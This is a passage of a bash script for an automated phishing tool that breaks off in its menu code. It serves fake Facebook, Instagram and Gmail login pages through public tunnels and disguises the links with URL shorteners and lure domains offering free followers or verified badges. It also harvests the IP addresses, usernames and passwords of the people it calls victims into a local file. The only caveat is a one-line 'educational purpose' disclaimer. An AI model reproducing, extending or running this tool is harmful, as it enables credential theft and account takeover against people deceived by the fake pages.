#!/bin/bash

##   render.phisher : 	Simple Automated Phishing Tool
##   Author 		: 	render437
##   Version 		: 	1.2.0
##   Github 		: 	https://github.com/render437/render.phisher


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2025  RENDER437 (https://github.com/render437)


__version__="1.2.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI Colors (Foreground + Background)
# Standard Colors
BLACK="$(printf '\033[30m')"   RED="$(printf '\033[31m')"     GREEN="$(printf '\033[32m')"  
YELLOW="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"    MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"    WHITE="$(printf '\033[37m')"   ORANGE="$(printf '\033[38;5;208m')"

# Bright Colors
BRIGHT_BLACK="$(printf '\033[90m')"   BRIGHT_RED="$(printf '\033[91m')"    
BRIGHT_GREEN="$(printf '\033[92m')"   BRIGHT_YELLOW="$(printf '\033[93m')"  
BRIGHT_BLUE="$(printf '\033[94m')"    BRIGHT_MAGENTA="$(printf '\033[95m')"  
BRIGHT_CYAN="$(printf '\033[96m')"    BRIGHT_WHITE="$(printf '\033[97m')"

# Background Colors
BLACKBG="$(printf '\033[40m')"   REDBG="$(printf '\033[41m')"     GREENBG="$(printf '\033[42m')"  
YELLOWBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"    MAGENTABG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"    WHITEBG="$(printf '\033[47m')"

# Bright Background Colors
BRIGHT_BLACKBG="$(printf '\033[100m')"   BRIGHT_REDBG="$(printf '\033[101m')"    
BRIGHT_GREENBG="$(printf '\033[102m')"   BRIGHT_YELLOWBG="$(printf '\033[103m')"  
BRIGHT_BLUEBG="$(printf '\033[104m')"    BRIGHT_MAGENTABG="$(printf '\033[105m')"  
BRIGHT_CYANBG="$(printf '\033[106m')"    BRIGHT_WHITEBG="$(printf '\033[107m')"

# Text Effects
BOLD="$(printf '\033[1m')"
DIM="$(printf '\033[2m')"
ITALIC="$(printf '\033[3m')"
UNDERLINE="$(printf '\033[4m')"
INVERT="$(printf '\033[7m')"
HIDDEN="$(printf '\033[8m')"
STRIKE="$(printf '\033[9m')"

# Reset
RESET="$(printf '\033[0m')"
RESETBG="$(printf '\033[49m')"


## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Banner
banner() {
    cat << EOF
${CYAN}                    _                   _     _     _                 
${CYAN}                   | |                 | |   (_)   | |                
${CYAN} _ __ ___ _ __   __| | ___ _ __   _ __ | |__  _ ___| |__   ___ _ __   
${CYAN}| '__/ _ \ '_ \ / _\` |/ _ \ '__| | '_ \| '_ \| / __| '_ \ / _ \ '__|  
${CYAN}| | |  __/ | | | (_| |  __/ |    | |_) | | | | \__ \ | | |  __/ |     
${CYAN}|_|  \___|_| |_|\__,_|\___|_|    | .__/|_| |_|_|___/_| |_|\___|_|     
${CYAN}                                 | |                                  
${CYAN}     ${RED}Tool created by Render${CYAN}      |_|       ${RED}Version: ${__version__} 

EOF
}


## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░░░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLUE}░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLUE}░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
		${BLUE}					${RED}Version ${__version__}
	EOF
}

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM


## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

# Check for new update
check_update() {
  local release_url='https://api.github.com/repos/render437/render.phisher/releases/latest'
  local ua='render-phisher-updater/1.0 (+https://example.com)'
  local tmpfile new_version tarball_url

  # prerequisites check
  for cmd in curl tar mktemp awk grep; do
    command -v "$cmd" >/dev/null 2>&1 || {
      echo "[!] required command '$cmd' not found"
      return 1
    }
  done

  [ -n "$__version__" ] || { echo "[!] __version__ not set"; return 1; }
  [ -n "$BASE_DIR" ]   || { echo "[!] BASE_DIR not set"; return 1; }

  echo -ne "\n${BRIGHT_GREEN} Checking for update: "

  # --- Get latest version safely ---
  if command -v jq >/dev/null 2>&1; then
    new_version=$(curl -sS -A "$ua" "$release_url" | jq -r '.tag_name // .name // empty')
  else
    new_version=$(curl -sS -A "$ua" "$release_url" \
      | grep -E '"tag_name"|"name"' \
      | head -n1 \
      | awk -F\" '{print $4}')
  fi

  if [ -z "$new_version" ]; then
    echo -e "${ORANGE}Could not determine latest version.${WHITE}"
    return 1
  fi

  tarball_url="https://github.com/render437/render.phisher/archive/refs/tags/${new_version}.tar.gz"

  # --- Compare versions ---
  if [[ "$new_version" != "$__version__" ]]; then
    echo -e "${ORANGE}update found${WHITE}"
    sleep 1
    echo -ne "\n${BRIGHT_GREEN} Downloading Update..."

    tmpfile=$(mktemp /tmp/render.phisher.XXXXXX.tar.gz) \
      || { echo "[!] mktemp failed"; return 1; }

    # download safely with retries
    if ! curl --fail --show-error --retry 3 --retry-delay 2 -L \
      -A "$ua" -o "$tmpfile" "$tarball_url"; then
      echo -e "\n${RED} Error occurred while downloading.${WHITE}"
      rm -f "$tmpfile"
      return 1
    fi

    # ensure BASE_DIR exists
    if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
      echo -e "\n${RED} Cannot create BASE_DIR: $BASE_DIR${WHITE}"
      rm -f "$tmpfile"
      return 1
    fi

    # extract safely
    if ! tar -xzf "$tmpfile" -C "$BASE_DIR" --strip-components=1 >/dev/null 2>&1; then
      echo -e "\n\n${RED} Error occurred while extracting.${WHITE}"
      rm -f "$tmpfile"
      return 1
    fi

    rm -f "$tmpfile"
    { sleep 1; clear; banner_small; } 2>/dev/null
    echo -e "\n${BRIGHT_GREEN} Successfully updated to ${new_version}! Run render.phisher again\n"
    reset_color 2>/dev/null || true
    return 0

  else
    echo -e "${GREEN}up to date${WHITE}"
    sleep .5
    return 0
  fi
}

## Check Internet Status
check_status() {
	echo -ne "\n${CYAN} Internet Status: "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e ""
}

## Dependencies
dependencies() {
	echo -e "\n${CYAN}Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${CYAN} Installing package: ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${CYAN} Installing package: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	# Check for php, curl, unzip, and jq
	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v jq) ]]; then
		echo -e "\n${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip jq)  # Add jq to the list of packages
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN} Cloudflared already installed."
	else
		echo -e "\n${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN} LocalXpose already installed."
	else
		echo -e "\n${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Install Ngrok
install_ngrok() {
    if command -v ngrok >/dev/null 2>&1; then
        echo -e "\n${GREEN} ngrok already installed."
        return
    fi

    echo -e "\n${CYAN} Installing ngrok...${WHITE}"

    ARCH=$(uname -m)

    # Pick correct binary for Intel or ARM Chromebooks
    if [[ "$ARCH" == "x86_64" ]]; then
        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz"
    elif [[ "$ARCH" == "aarch64" || "$ARCH" == arm* ]]; then
        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz"
    else
        echo -e "${RED} Unsupported CPU architecture: $ARCH"
        return 1
    fi

    mkdir -p .server
    cd .server

    # Download & extract
    wget -q "$NGROK_URL" -O ngrok.tgz
    tar -xvf ngrok.tgz >/dev/null
    rm ngrok.tgz

    # Move ngrok into .server directory
    mv ngrok loc-ngrok
    chmod +x loc-ngrok

    cd ..

    echo -e "${GREEN} ngrok installed successfully (anonymous mode)."
    echo -e "${YELLOW} You can use it with: ${WHITE}.server/loc-ngrok http 8080"
}



## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${BRIGHT_GREEN} Author:   ${BRIGHT_BLUE}render437
		${BRIGHT_GREEN} Github:   ${BRIGHT_BLUE}https://github.com/render437
		${BRIGHT_GREEN} Version:  ${BRIGHT_BLUE}${__version__}

		${RED}Warning:
		${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}
		${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}
		
		${ORANGE}Contributors:
		${BRIGHT_GREEN} xroche, Aditya Shakya, htr-tech,
		${BRIGHT_GREEN} Ali Milani, KasRoudra, TripleHat, Mr.Derek

		${BRIGHT_MAGENTA}0. Main Menu     ${BRIGHT_MAGENTA}99. Exit

	EOF

	echo
	read -p "${MAGENTA}Select an option:"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${MAGENTA}Do You Want A Custom Port: y/N:${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "{MAGENTA} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED} Invalid 4-digit Port: $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${CYAN} Using Default Port $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
    echo -e "\n${CYAN} Setting up server..."${WHITE}
    if [ "$website" = "camera" ]; then
        cp -rf .sites/"$website"/* .server/www
        cp -f .sites/"$website"/location.php .server/www/
    else
        cp -rf .sites/"$website"/* .server/www
        cp -f .sites/ip.php .server/www/
    fi
    echo -ne "\n${CYAN} Successfully set up PHP server!"${WHITE}
    cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}


## Get IP address
capture_ip() {
    victim_ip=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
    IFS=$'\n'
    echo -e "\n${GREEN} Victim's IP: ${BLUE}$victim_ip"
    echo -ne "\n${BLUE} Saved in: ${ORANGE}auth/ip.txt"
    cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
    # Ensure victim_ip is set
    if [ -z "$victim_ip" ]; then
        # If IP was not captured, try to read it directly
        victim_ip=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
    fi
    
    # Extract username and password
    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
    
    IFS=$'\n'
    # Print info to console
    echo -e "\n${GREEN} Victim IP: ${BLUE}$victim_ip"
    echo -e "\n${GREEN} Account: ${BLUE}$ACCOUNT"
    echo -e "\n${GREEN} Password: ${BLUE}$PASSWORD"
    echo -e "\n${BLUE} Saved in: ${ORANGE}auth/usernames.dat"
    
    # Save IP and credentials to file
    echo "Victim IP: $victim_ip" >> auth/usernames.dat
    echo "Account: $ACCOUNT" >> auth/usernames.dat
    echo "Password: $PASSWORD" >> auth/usernames.dat
    # Add separator
    echo "-------------------------------------------------------" >> auth/usernames.dat
}

## Print data
capture_data() {
	echo -ne "\n${CYAN} Awaiting login info... ${CYAN}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start Cloudflared
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	echo -e "\n${ORANGE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${CYAN} Waiting for Cloudflare response..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token:${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose
start_loclx() {
	cusport
	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${BRIGHT_GREEN} Initializing... ${BRIGHT_GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${BRIGHT_GREEN} Successfully Hosted at: ${BRIGHT_GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Start ngrok
ngrok_auth() {
	./.server/ngrok authtoken -help > /dev/null 2>&1 &
	sleep 1

	auth_f="$HOME/.ngrok2/ngrok.yml"

	# Check if ngrok is configured (authtoken exists in config file)
	if ! grep -q "authtoken:" "$auth_f"; then
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
		[[ $ngrok_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
		} || {
			# Create .ngrok2 directory if it doesn't exist
			mkdir -p "$HOME/.ngrok2"

			# Write the authtoken to the ngrok.yml file
			echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
		}
	fi
}

start_ngrok() {
	cusport #Assuming this sets $HOST and $PORT
	ngrok_auth # Ensure authtoken is configured

	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"

	echo -ne "\n\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Starting Ngrok tunnel..."

	if [[ `command -v termux-chroot` ]]; then
    	sleep 2 && termux-chroot ./.server/ngrok tcp $PORT &
	else
		sleep 2 && ./.server/ngrok tcp $PORT &
	fi


	sleep 5 #Give ngrok time to start

	#Find the ngrok URL (you may need to adjust the grep if the output format changes)
	ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')


	if [[ -z "$ngrok_url" ]]; then
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to retrieve Ngrok URL. Check Ngrok logs or try again.${RED}"
	else
		custom_url "$ngrok_url"
		capture_data
	fi

}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF
		${CYAN} 0. Main Menu
		${CYAN} 1. Localhost
		${CYAN} 2. Ngrok.io
		${CYAN} 3. Cloudflared
	EOF

	read -p "${MAGENTA} Select a port forwarding service or return to main menu:"

	case $REPLY in 
		0 | 00)
			echo -ne "\n${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${ORANGE} Do you want to Mask the URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://claim-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${CYAN} Using custom Masked Url:${GREEN} $mask"
		else
			echo -e "\n${ORANGE} Invalid url type..."
			echo -e "\n${ORANGE} Using the defualt url instead..."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="Unable to generate links. Try after turning on your hotspot or restarting your system"
		processed_url="Unable to Shorten URL"
	fi

	echo -e "\n${BRIGHT_GREEN} URL 1 : ${GREEN}$url"
	echo -e "\n${BRIGHT_GREEN} URL 2 : ${ORANGE}$processed_url"
	[[ $processed_url != *"Unable"* ]] && echo -e "\n${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook
site_facebook() {
	cat <<- EOF

		${CYAN}1. Traditional Login Page
		${CYAN}2. Advanced Voting Poll Login Page
		${CYAN}3. Fake Security Login Page
		${CYAN}4. Facebook Messenger Login Page

	EOF

	echo
	read -p "${MAGENTA}Select an option:"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${CYAN}1. Traditional Login Page
		${CYAN}2. Auto Followers Login Page
		${CYAN}3. 1000 Followers Login Page
		${CYAN}4. Blue Badge Verify Login Page

	EOF

	echo
	read -p "${MAGENTA}Select an option:"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${CYAN}1. Gmail Old Login Page
		${CYAN}2. Gmail New Login Page
		${CYAN}3. Advanced Voting Poll Page

	EOF

	echo
	read -p "${MAGENTA}Select an option:"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
